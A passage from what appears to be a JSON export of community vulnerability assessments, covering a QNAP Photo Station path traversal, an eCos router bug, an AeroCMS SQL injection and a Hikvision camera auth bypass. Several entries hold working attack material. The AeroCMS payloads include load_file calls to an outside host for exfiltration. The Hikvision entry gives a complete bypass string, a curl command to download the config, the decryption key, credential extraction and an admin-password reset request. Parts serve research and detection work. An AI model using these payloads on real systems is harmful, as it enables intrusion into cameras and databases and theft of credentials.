article?\r\n\r\nFinally, this research demonstrates that we clearly need *some* kind of mechanism to challenge weird-looking updates to the KEV list to avoid burning a lot of time, effort, money, and heartache on chasing vulnerabilities that many, many people *must* chase because they're subject to [BOD-22-1](https://www.cisa.gov/binding-operational-directive-22-01).\r\n\r\n\r\n*edit: Title changed as per request at 4:22pm EST on Sept. 2, 2022*",
      "score": 3,
      "metadata": {
        "mitre-tactics": "Execution",
        "attacker-value": 2,
        "exploitability": 1
      },
      "tags": [
        {
          "id": "01c67142-c23f-4ee7-8803-49d10d588299",
          "name": "Requires user interaction",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "requires_interaction"
        }
      ]
    },
    {
      "id": "9988bcd6-58c4-44be-92fc-6ea8ca74f06a",
      "editorId": "d8c8480d-891a-4357-a086-25351dae6598",
      "topicId": "11c7642a-f72b-4d61-b99a-08f365f1e1d9",
      "created": "2022-09-08T16:07:46.192081Z",
      "revisionDate": "2022-09-08T16:07:46.190169Z",
      "document": "On September 3, 2022, QNAP issued a security advisory, [QSA-22-24](https://www.qnap.com.cn/zh-cn/security-advisory/qsa-22-24), detailing active exploitation of a vulnerability affecting QNAP NAS devices with [Photo Station](https://www.qnap.com/en/app_releasenotes/list.php?app_choose=PhotoStation) installed. QNAP\u2019s advisory contained almost no useful details beyond affected versions. The advisory didn\u2019t say if the attack required authentication or not. It didn\u2019t indicate if the attack was some type of bypass or code execution issue. It didn\u2019t clarify if user interaction might play a role. QNAP waited five days to assign [CVE-2022-27593](https://nvd.nist.gov/vuln/detail/CVE-2022-27593) on September 8, 2022.\r\n\r\nIn order to be affected by CVE-2022-27593, the QNAP NAS must have the Photo Station \u201capp\u201d installed on the device. Photo Station is not installed by default, but appears to be a popular app. QNAP indicates the following versions are affected:\r\n\r\n* QTS 5.0.1: Photo Station 6.1.2 and later\r\n* QTS 5.0.0/4.5.x: Photo Station 6.0.22 and later\r\n* QTS 4.3.6: Photo Station 5.7.18 and later\r\n* QTS 4.3.3: Photo Station 5.4.15 and later\r\n* QTS 4.2.6: Photo Station 5.2.14 and later\r\n\r\nCVE-2022-27593 is reportedly being exploited in the wild by the Deadbolt ransomware crew. [Censys](https://search.censys.io/search?resource=hosts&sort=RELEVANCE&per_page=100&virtual_hosts=INCLUDE&q=services.http.response.html_title%3A+%22ALL+YOUR+FILES+HAVE+BEEN+LOCKED+BY+DEADBOLT.%22) currently finds more than 1,000 NAS that have fallen victim to Deadbolt. No public exploit code exists, although this write up will introduce, what we believe to be, the basis of the exploit.\r\n\r\n## Patch Diff\r\n\r\nWe did patch analysis on Photo Station 5.2.13, 5.2.14, 6.0.21, and 6.0.22. Only this change really stood out to us:\r\n\r\n```\r\n--- ./PhotoStation_6.0.21/photostation2/combine.php\t2022-06-01 11:05:40.000000000 -0700\r\n+++ ./PhotoStation_6.0.22/photostation2/combine.php\t2022-09-03 06:08:16.000000000 -0700\r\n@@ -180,7 +180,7 @@\r\n \r\n \t\tif ($cache) {\r\n \t\t\t// Try the cache first to see if the combined files were already generated\r\n-\t\t\t$cachefile = 'cache-' . $_GET['g'] . '-' . $hash . '.' . $type . ($encoding != 'none' ? '.' . $encoding : '');\r\n+\t\t\t$cachefile = 'cache-' . $hash . '.' . $type . ($encoding != 'none' ? '.' . $encoding : '');\r\n```\r\n\r\nThis change in `combine.php` removes the attacker\u2019s ability to influence the name of `$cachefile`. The `$cachefile` variable is eventually used to write a file to disk:\r\n\r\n```php\r\nif ($fp = fopen($cachedir . '/' . $cachefile, 'wb')) {\r\n\tfwrite($fp, $contents);\r\n\tfclose($fp);\r\n\tchmod($cachedir . '/' . $cachefile, 0777);\r\n}\r\n```\r\n\r\n`combine.php` intends to optimize downloading of Photo Station\u2019s `.js` and `.css` files by combining them into a single file and caching that single file on disk for later retrieval. It\u2019s dubious how effective this strategy is given the likely close proximity of the user and the NAS, but that is what it exists to do. The user (attacker) has no control over the file contents, as `combine.php` operates on a predefined list of files.\r\n\r\nThe cached files are written in `/share/CACHEDEV1_DATA/.qpkg/photostation2/cache/`, which **notably** doesn\u2019t contain any subdirectories (important later). Here is an example of some legitimate cache files:\r\n\r\n```sh\r\n[albinolobster@NAS4A32F3 cache]$ pwd\r\n/share/CACHEDEV1_DATA/.qpkg/photostation2/cache\r\n[albinolobster@NAS4A32F3 cache]$ ls -l\r\ntotal 336\r\n-rwxrwxrwx 1 admin administrators 272577 2022-09-07 18:55 cache-gallery-860177714-b5e445c04a689b88e2ae9b41ed1ee3b9.javascript.gzip*\r\n-rwxrwxrwx 1 admin administrators  67946 2022-09-07 18:55 cache-main-845839342-2deda6ba098a12d8abccf909ae63cc6e.css.gzip*\r\n[albinolobster@NAS4A32F3 cache]$ \r\n```\r\n\r\nHowever, as we see in the diff above, the attacker has some influence over the filename using the `g` parameter \u2014 although `g` itself has requirements that prevent the attacker from fully controlling the parameter. `g` must start with a predefined `group` value and use `-` to separate strings.\r\n\r\n```php\r\n$group = explode('-', $_GET['g']);\r\n\r\nswitch ($group[0]) {\r\n\tcase 'core':\r\n```\r\n\r\nAdding to the complication, the `$cachefile` has additional strings prepended and appended that the attacker has almost no influence over.\r\n\r\n*However, due to an odd quirk of PHP\u2019s `fopen`, an attacker can traverse out of the `cache` directory and write the cache files to arbitrary locations*. Normally a directory traversal requires a complete and valid path. For example, consider the following PHP code and the bash output from my Ubuntu box.\r\n\r\n```php\r\n<?php\r\n\r\n    if ($fp = fopen('/tmp/../wat/../tmp/r7_test', 'wb')) {\r\n\t    fwrite($fp, 'hi');\r\n\t    fclose($fp);\r\n\t    chmod('/tmp/../wat/../tmp/r7_test', 0777);\r\n    }\r\n?>\r\n```\r\n\r\n```sh\r\nalbinolobster@ubuntu:~$ ls -l /tmp/r7_test\r\nls: cannot access '/tmp/r7_test': No such file or directory\r\nalbinolobster@ubuntu:~$ ls -l /tmp/../wat/../tmp/r7_test\r\nls: cannot access '/tmp/../wat/../tmp/r7_test': No such file or directory\r\nalbinolobster@ubuntu:~$ php travesal.php \r\nPHP Warning:  chmod(): No such file or directory in /home/albinolobster/travesal.php on line 6\r\nalbinolobster@ubuntu:~$ ls -l /tmp/../wat/../tmp/r7_test\r\nls: cannot access '/tmp/../wat/../tmp/r7_test': No such file or directory\r\nalbinolobster@ubuntu:~$ ls -l /tmp/r7_test\r\n-rw-rw-r-- 1 albinolobster albinolobster 2 Sep  8 07:48 /tmp/r7_test\r\nalbinolobster@ubuntu:~$ ls -l /wat/\r\nls: cannot access '/wat/': No such file or directory\r\n```\r\n\r\nAbove, you can see that `ls -l /tmp/../wat/../tmp/r7_test` fails because `/wat/` doesn\u2019t exist. However, `fopen('/tmp/../wat/../tmp/r7_test', 'wb')` successfully creates `/tmp/r7_test` despite the missing directory. That\u2019s important to the QNAP's `combine.php` because:\r\n\r\n* The attacker has sufficient control to add directory traversal characters, but doesn\u2019t have control over the `$cachefile`initial characters.\r\n* The `cache` directory doesn\u2019t contain any subdirectories.\r\n\r\nThis odd behavior of `fopen` means that an attacker should be able to use the `g` parameter to traverse through the system. Here is a curl-based example of using the `g` parameter to write to `/share/CACHEDEV1_DATA/.qpkg/` instead of ``/share/CACHEDEV1_DATA/.qpkg/photostation2/cache`.\r\n\r\n```sh\r\nalbinolobster@ubuntu:~$ curl -kv \"http://10.12.70.249:8080/photo/combine.php?type=javascript&g=core-r7rules/../../../hello.php.\" --output /dev/null\r\n*   Trying 10.12.70.249:8080...\r\n* TCP_NODELAY set\r\n  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current\r\n                                 Dload  Upload   Total   Spent    Left  Speed\r\n  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0* Connected to 10.12.70.249 (10.12.70.249) port 8080 (#0)\r\n> GET /photo/combine.php?type=javascript&g=core-r7rules/../../../hello.php. HTTP/1.1\r\n> Host: 10.12.70.249:8080\r\n> User-Agent: curl/7.68.0\r\n> Accept: */*\r\n> \r\n* Mark bundle as not supporting multiuse\r\n< HTTP/1.1 200 OK\r\n< Date: Thu, 08 Sep 2022 19:54:52 GMT\r\n< Server: Apache\r\n< Etag: \"3e0c25bbe8bf3a21ee345dff99f111f2\"\r\n< Last-Modified: 1654107034\r\n< Cache-Control: public, max-age=31536000\r\n< X-Frame-Options: SAMEORIGIN\r\n< Upgrade: h2\r\n< Connection: Upgrade\r\n< Content-Length: 982250\r\n< Content-Type: application/javascript\r\n< \r\n{ [4037 bytes data]\r\n100  959k  100  959k    0     0  6900k      0 --:--:-- --:--:-- --:--:-- 6900k\r\n* Connection #0 to host 10.12.70.249 left intact\r\n```\r\n\r\nWhich results in the following output from the NAS\u2019s SSH CLI:\r\n\r\n```sh\r\n[albinolobster@NAS4A32F3 cache]$ ls -l ../../\r\ntotal 980\r\n-rw-r--r--  1 admin administrators 982250 2022-09-08 15:54 hello.php.-3e0c25bbe8bf3a21ee345dff99f111f2.javascript\r\ndrwxrwxrwx  7 admin administrators   4096 2022-09-06 15:51 MultimediaConsole/\r\ndrwxrwxr-x  5 admin administrators   4096 2022-06-01 14:11 PhotoStation/\r\ndrwxr-xr-x 14 admin administrators   4096 2022-09-06 18:33 photostation2/\r\ndrwxr-xr-x  3 admin administrators   4096 2022-07-08 15:37 phpMyAdmin/\r\ndrwxr-xr-x 10 admin administrators   4096 2022-07-15 16:07 QsyncServer/\r\n[albinolobster@NAS4A32F3 cache]$ \r\n```\r\n\r\nThis **is not** a demonstration of remote code execution. All we\u2019ve demonstrated so far is that files can be created anywhere on disk with the attacker maintaining partial control of the filename but no control of the file contents. Technically speaking, we have demonstrated a vulnerability though. We could fill up the disk using this `curl` command because we\u2019ve now escaped `combine.php`\u2019s clean-up logic:\r\n\r\n```php\r\n//remove residual files before saving the cache\r\nif ($type == 'css') {\r\nexec('/bin/rm -f ' . escapeshellarg($cachedir) . '/cache-' . escapeshellarg($group[0]) . '*.css.gzip');\r\n} else if($type == 'javascript') {\r\n\texec('/bin/rm -f ' . escapeshellarg($cachedir) . '/cache-' .escapeshellarg( $group[0]) . '*.javascript.gzip');\r\n}\r\n```\r\n\r\nBut to achieve remote code execution, there needs to be an additional sink \u2014 presumably something that will mishandle the filename the attacker assigns. That seems in line with the CWE assigned by QNAP. QNAP assigned [CWE-610](https://cwe.mitre.org/data/definitions/610.html), *Externally Controlled Reference to a Resource in Another Sphere\u201d, which is a parent of [CWE-73](https://cwe.mitre.org/data/definitions/73.html), *External Control of File Name or Path*. So, while we may not have demonstrated the exact code execution sink here, we believe this is the correct primitive and sufficient to write signatures and detections against.",
      "score": 1,
      "metadata": {
        "mitre-tactics": "Initial Access",
        "attacker-value": 5,
        "exploitability": 3
      },
      "tags": [
        {
          "id": "791283de-d643-4ede-850e-91a6edb897db",
          "name": "Exploited in the wild",
          "type": "exploited_in_the_wild",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "exploited_in_the_wild"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        }
      ]
    },
    {
      "id": "c0f74a39-519c-49cb-9dd8-ae29cf58d909",
      "editorId": "d8c8480d-891a-4357-a086-25351dae6598",
      "topicId": "8e9f26ba-7273-4a0b-84b4-a509e044077f",
      "created": "2022-09-09T15:52:37.797984Z",
      "revisionDate": "2022-09-09T19:34:40.355414Z",
      "document": "CVE-2022-27255 was presented at DEF CON 30 in August 2022. The researchers have shared their slides, exploits, and research scripts on [GitHub](https://github.com/infobyte/cve-2022-27255), for which we thank them profusely. CVE-2022-27255 is a memory corruption vulnerability when [eCos](https://en.wikipedia.org/wiki/ECos) parses SIP packets containing crafted SDP (during NAT translation). Because eCos is used by a variety of SOHO routers, the vulnerability is present in a wide range of devices shipped by a number of different organizations. At the time of writing, the set of vulnerable systems was believed to be:\r\n\r\n```\r\nNexxt Nebula 300 Plus\r\nTenda F6 V5.0\r\nTenda F3 V3\r\nTenda F9 V2.0\r\nTenda AC5 V3.0\r\nTenda AC6 V5.0\r\nTenda AC7 V4.0\r\nTenda A9 V3\r\nTenda AC8 V2.0\r\nTenda AC10 V3\r\nTenda AC11 V2.0\r\nTenda FH456 V4.0\r\nZyxel NBG6615 V1.00\r\nIntelbras RF 301K V1.1.15\r\nMultilaser AC1200 RE018\r\niBall 300M-MIMO (iB-WRB303N)\r\nBrostrend AC1200 extender\r\nMT-Link MT-WR850N\r\nMT-Link MT-WR950N\r\nEverest EWR-301\r\nD-Link DIR-822 h/w version B\r\nSpeedefy K4\r\nUltra-Link Wireless N300 Universal Range Extender\r\nKeo KLR 301\r\nQPCOM QP-WR347N\r\nNEXT 504N\r\nNisuta NS-WIR303N (probably V2)\r\nRockspace AC2100 Dual Band Wi-Fi Range Extender\r\nKNUP KP-R04\r\nHikvision DS-3WR12-E\r\n```\r\n\r\nAlso, at the time of writing, it is believed that none of these devices have been patched for the vulnerability yet.\r\n\r\nThe researchers have shared a proof of concept [video](https://github.com/infobyte/cve-2022-27255/blob/main/DEFCON/poc.mp4) and an [exploit](https://github.com/infobyte/cve-2022-27255/blob/main/exploits_nexxt/exploit_telnet_no_reboot.py) for the Nexxt Nebula 300 Plus. The downside of the researchers choosing the Nexxt Nebula 300 Plus is that it appears to be very difficult to acquire, but you can still [download the firmware](https://support.nexxtsolutions.com/006310-All-Routers-Firmware-Updates) and test out some of their other tooling.\r\n\r\nThe only thing preventing this vulnerability from receiving widespread attention is that each router is going to need slightly different shell code. If someone were to spend time writing exploits for a majority of these targets, I think this would receive a good deal of attention, and be pretty useful. But until then, I fear that this will remain somewhat obscure to most hackers in the community.",
      "score": 2,
      "metadata": {
        "mitre-tactics": "Initial Access",
        "attacker-value": 5,
        "exploitability": 2
      },
      "tags": [
        {
          "id": "1a4228a8-bc05-41a0-a7ee-43d4fa7e381e",
          "name": "Difficult to patch",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "difficult_to_patch"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        },
        {
          "id": "3e5a47c9-35b0-4d55-92e4-0e83e6cbb2ec",
          "name": "Difficult to weaponize",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "difficult_to_develop"
        }
      ]
    },
    {
      "id": "9b6fd24e-0041-4fb6-951d-d665879f4f40",
      "editorId": "198da8db-21b5-4678-a70d-51ae5c950847",
      "topicId": "b61307e3-f643-42ac-9188-e04953232f24",
      "created": "2022-09-10T07:40:39.058163Z",
      "revisionDate": "2022-09-10T07:42:09.471226Z",
      "document": "![](https://raw.githubusercontent.com/nu11secur1ty/CVE-nu11secur1ty/main/vendors/MegaTKC/2021/AeroCMS-v0.0.1-SQLi/Docs/Screenshot%202022-08-27%20170954.png)\r\n\r\n\r\n## Description:\r\nThe `author` parameter from the AeroCMS-v0.0.1 CMS system appears to be vulnerable to SQL injection attacks. \r\nThe malicious user can dump-steal the database, from this CMS system and he can use it for very malicious purposes.\r\n\r\nSTATUS: HIGH Vulnerability\r\n\r\n[+]Payload:\r\n```MySQL\r\n---\r\nParameter: author (GET)\r\n    Type: boolean-based blind\r\n    Title: OR boolean-based blind - WHERE or HAVING clause\r\n    Payload: author=-5045' OR 8646=8646 AND 'YeVm'='YeVm&p_id=4\r\n\r\n    Type: error-based\r\n    Title: MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)\r\n    Payload: author=admin'+(select load_file('\\\\\\\\7z7rajg38ugkp9dswbo345g0nrtkha518pzcp0e.kufar.com\\\\pvq'))+'' OR (SELECT 7539 FROM(SELECT COUNT(*),CONCAT(0x717a6a6a71,(SELECT (ELT(7539=7539,1))),0x7170716b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND 'mwLN'='mwLN&p_id=4\r\n\r\n    Type: time-based blind\r\n    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)\r\n    Payload: author=admin'+(select load_file('\\\\\\\\7z7rajg38ugkp9dswbo345g0nrtkha518pzcp0e.kufar.com\\\\pvq'))+'' AND (SELECT 6824 FROM (SELECT(SLEEP(5)))QfTF) AND 'zVTI'='zVTI&p_id=4\r\n\r\n    Type: UNION query\r\n    Title: MySQL UNION query (NULL) - 10 columns\r\n    Payload: author=admin'+(select load_file('\\\\\\\\7z7rajg38ugkp9dswbo345g0nrtkha518pzcp0e.kufar.com\\\\pvq'))+'' UNION ALL SELECT NULL,NULL,CONCAT(0x717a6a6a71,0x4f617a456c7953617866546b7a666d49434d644662587149734b6d517a4e674d5471615a73616d58,0x7170716b71),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#&p_id=4\r\n---\r\n\r\n```\r\n\r\n## Reproduce:\r\n[href](https://github.com/nu11secur1ty/CVE-nu11secur1ty/tree/main/vendors/MegaTKC/2021/AeroCMS-v0.0.1-SQLi)\r\n\r\n## Proof and Exploit:\r\n[href](https://streamable.com/ir9bjt)",
      "score": 1,
      "metadata": {
        "mitre-tactics": "Execution",
        "attacker-value": 5,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "ebfeb067-6577-4c6a-a8a7-82fd540dca25",
      "editorId": "8a465efa-5959-4307-868a-5c6bd2f9fdc9",
      "topicId": "84a8e7d4-3755-4576-aaa3-0e9f117ac09c",
      "created": "2022-09-16T19:41:32.135133Z",
      "revisionDate": "2022-10-06T14:55:18.29988Z",
      "document": "Recently, I bumped into a bunch of Hikvision camera's during a security engagement and surprise, surprise, they were all vulnerable against this old vulnerability CVE-2017-7921 discovered by Monte Crypto in September 2017.  You can find his write up here: https://packetstormsecurity.com/files/144097/Hikvision-IP-Camera-Access-Bypass.html. \r\n\r\nIt made me curious, because we are five years further in the game and it looks that the majority of the Hikvison camera's and other white-labelled  versions are still vulnerable. \r\nI ran a quick scan with Shodan (search: \"App-webs\" \"200 OK\") and it returns around 160.000 potential targets where, based on my quick assessment, probably **20%** remains vulnerable !!!\r\n\r\nThis is of course bad or good news depending which side you are on ;-), but regardless if you are a good or bad actor, it does make sense to revisit this old timer once more again.\r\n\r\n**A small deep dive into the problem**\r\n\r\nMany Hikvision IP cameras contain a backdoor have improper authorization logic that allows unauthenticated impersonation of any configured user account.\r\nThe basics of this vulnerability is very simple. \r\n\r\n**Updated based on the comment of** @gwillcox-r7\r\n~~Our dear programmers from Hikvision left a piece of a code in the vulnerable firmware that has a hard coded magic string that bypasses all security on the camera and will provide full admin access~~.  Our dear programmers from Hikvision developed proprietary HikCGI protocol, which exposes URI endpoints through the camera's web interface. The HikCGI protocol handler checks for the presence of a parameter named `auth` in the query string and if that parameter contains a base64-encoded `username:password` string, the HikCGI API call assumes the identity of the specified user and the password is ignored. \r\nUsing user `admin` bypasses all security on the camera and allows an attacker to completely control  the camera and modify any setting or retrieve sensible information.\r\n\r\nYou use any combination of base64 encoded `admin:password` string, such as the one below.\r\n```\r\n# echo \"admin:11\" | base64\r\nYWRtaW46MTEK\r\n```  \r\nAll what is needed is to append this magic string `?auth=YWRtaW46MTEK` to GET and POST queries  to access the camera with administrative privileges and do whatever you want.\r\n\r\nExamples are:\r\nRetrieve a list of all users and their roles: `http://camera.ip/Security/users?auth=YWRtaW46MTEK`\r\nObtain a camera snapshot without authentication: `http://camera.ip/onvif-http/snapshot?auth=YWRtaW46MTEK`\r\nor one can download the camera configuration: `http://camera.ip/System/configurationFile?auth=YWRtaW46MTEK`\r\n\r\nAnd the use cases for exploitation are numerous, as described in the [HIKCGI Integration Guide](https://www.google.com/url?sa=t&rct=j&q=&esrc=s&source=web&cd=&cad=rja&uact=8&ved=2ahUKEwi2yuHI7Jn6AhUZ_7sIHUSaC8oQFnoECAIQAQ&url=https%3A%2F%2Fipvm-uploads.s3.amazonaws.com%2Fuploads%2F5f72%2F4020%2F324284210-HIKCGI-Integration-Guide.pdf&usg=AOvVaw1_D3T53yzttBwB0mDX9cnX) and [IP Media Device Management Protocol User Guide](https://pdfcoffee.com/hikvision-cgi-ipmd-v159-pdf-free.html) from Hikvision.\r\n\r\nLet me take two use cases to show how easy it is to retrieve users and passwords and change them.\r\n\r\nFirst of all, if you want to retrieve the users and passwords, just first pull the configuration file from the vulnerable camera using the magic string.\r\n\r\n``` \r\ncurl http://camera.ip/System/configurationFile?auth=YWRtaW46MTEK --output configurationFile\r\n```\r\nYou should get a file named `configurationFile` which holds all camera information including the user and password information in plain text.\r\nHowever this file is encrypted (rather weak ;-0), so we need to decrypt it first.\r\n\r\nThere is a nice tool made by [WormChickenWizard](https://github.com/WormChickenWizard/hikvision-xor-decrypter) that will the job for us.  Check it out, but for now I just apply the logic that he described in his README.md.\r\n\r\nFirst decrypt the `configurationFile` with following command:\r\n```\r\nopenssl enc -d -in configurationFile -out decryptedoutput -aes-128-ecb -K 279977f62f6cfd2d91cd75b889ce0c9a -nosalt -md md5\r\n```\r\nThe AES encryption is now broken but the `decryptedoutput` file is still xor encoded.\r\nUse the tool from [WormChickenWizard](https://github.com/WormChickenWizard/hikvision-xor-decrypter) to decrypt the `decrytedoutput` file to create a readable format that we can view with a hex editor to search for the users and passwords in plain text format.\r\n\r\n```\r\njava XORDecode\r\n```\r\nYou should now have a file called `plaintextOutput` file that you can inspect with a hex viewer or editor.\r\n\r\n``` \r\nhexedit plaintextOutput\r\n```\r\nYou will see output like this and the first admin and password you will find is the default admin password when your perform a factory reset (I love these Hikvision developers ;-)\r\n\r\n```\r\n00008358   02 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  ....................................\r\n0000837C   00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  ....................................\r\n000083A0   00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  ....................................\r\n000083C4   00 00 00 00  61 64 6D 69  6E 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  ....admin...........................\r\n000083E8   31 32 33 34  35 00 00 00  00 00 00 00  00 00 00 00  FF FF FF FF  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  12345...............................\r\n0000840C   00 00 00 00  00 00 00 00  00 00 00 00  00 00 02 02  00 00 00 00  FF FF FF FF  00 00 00 00  FF FF FF FF  00 00 00 00  ....................................\r\n00008430   FF FF FF FF  00 00 00 00  FF FF FF FF  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  ....................................\r\n00008454   00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  ....................................\r\n00008478   00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  ....................................\r\n---  plaintextOutput       --0x801C/0xD8B30--4%---------------------------------------------------------------------------------------------------------------------\r\n```\r\nIf you search a bit further, you will find the actual users and passwords. In this case two users (admin and admln)\r\n\r\n```\r\n000A7BD4   00 00 00 00  08 10 00 00  00 00 00 00  61 64 6D 69  6E 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  ............admin...................\r\n000A7BF8   00 00 00 00  00 00 00 00  50 61 24 24  57 30 72 64  00 00 00 00  00 00 00 00  FF FF FF FF  00 00 00 00  00 00 00 00  ........Pa$$W0rd....................\r\n000A7C1C   00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  00 00 02 02  00 00 00 00  FF FF FF FF  00 00 00 00  ....................................\r\n000A7C40   FF FF FF FF  00 00 00 00  FF FF FF FF  00 00 00 00  FF FF FF FF  00 00 00 00  61 64 6D 6C  6E 00 00 00  00 00 00 00  ........................admln.......\r\n000A7C64   00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  61 73 64 66  31 32 33 34  00 00 00 00  00 00 00 00  ....................asdf1234........\r\n000A7C88   00 70 0D 00  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  00 00 02 01  .p..................................\r\n000A7CAC   00 00 00 00  01 00 00 00  00 00 00 00  01 00 00 00  00 00 00 00  01 00 00 00  00 00 00 00  01 00 00 00  00 00 00 00  ....................................\r\n---  plaintextOutput       --0xA7850/0xD8B30--77%-------------------------------------------------------------------------------------------------------------------\r\n```\r\n \r\nNow if this is all too much effort, you can also decide to just reset the admin password with a new password.\r\nThe HTML code for that is pretty simple and can be easily executed using `burp`\r\n\r\n**Note:** The new password  should at least have 2 UPPERCASE, 2 lowercase and 2 special characters, otherwise it will not be accepted.\r\n\r\nBurp request:\r\n```\r\nPUT /Security/users/1?auth=YWRtaW46MTEK HTTP/1.1\r\n\r\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\r\n<User version=\"1.0\" xmlns=\"http://www.hikvision.com/ver10/XMLSchema\">\r\n<id>1</id>\r\n<userName>admin</userName>\r\n<password>Pa$$W0rd</password>\r\n</User>\r\n```\r\n\r\nTo fix CVE-2017-7921, we recommend that users upgrade their Hikvision firmware to the latest version, but looking at the number of vulnerable camera's out there, this will probably not help :-(.\r\n\r\n### References\r\nI have added a reference to a Metasploit module that I developed and checks for a vulnerable camera and does the password reset for you.\r\nI am currently updating the functionality of this module with some more actions to retrieve the config file, make a snapshot, enumerate the users and other stuff...\r\nThis module will be submitted shortly to the mainstream of Metasploit for acceptance of the Rapid7 development team.\r\n\r\nMetasploit Hikvision module -> https://github.com/h00die-gr3y/Metasploit/\r\n\r\n**Update 24 September 2022:**\r\nMetasploit Hikvision module has been released to the mainstream -> https://github.com/rapid7/metasploit-framework/pull/17033\r\n",
      "score": 2,
      "metadata": {
        "mitre-tactics": "Collection",
        "attacker-value": 5,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "1a4228a8-bc05-41a0-a7ee-43d4fa7e381e",
          "name": "Difficult to patch",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "difficult_to_patch"
        },
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "12305ed5-bf54-4fe9-981c-d69e6e6887b1",
      "editorId": "3c365bdb-276d-447c-a5d3-48c652930285",
      "topicId": "95ba23fe-cab6-4758-b294-2a870f37726d",
      "created": "2022-09-18T10:32:12.580821Z",
      "revisionDate": "2022-09-18T10:32:12.582159Z",
      "document": "I must be missing something as the PoC script *https://github.com/78ResearchLab/PoC/blob/main/CVE-2022-34721/CVE-2022-34721.py) does not execute any exception/BSOD let alone the RCE. \r\n\r\nFrom what I can see, the script does not carry any RCE payload, but I thought it would at least cause some app/os exception. \r\nWhen I fire it up against w2k19 VPN server, nothing happens.\r\nI would have expected that at least some kind of unhandled exception/BSOD occurred, but nothing ...",
      "score": 1,
      "metadata": {},
      "tags": []
    },
    {
      "id": "47abbb59-280b-460f-9aa7-f73d38bead68",
      "editorId": "dadd7295-ffae-449d-ba22-0a6feefa6f67",
      "topicId": "a5f9a5b4-eef8-4409-9d1d-846536b8d033",
      "created": "2022-09-20T21:03:42.888048Z",
      "revisionDate": "2022-09-20T21:03:42.887941Z",
      "document": "Very easy patch to reverse and exploit to develop. Public proof of concept exist, as well as a Metasploit module. Very important to patch!",
      "score": 1,
      "metadata": {
        "attacker-value": 4,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
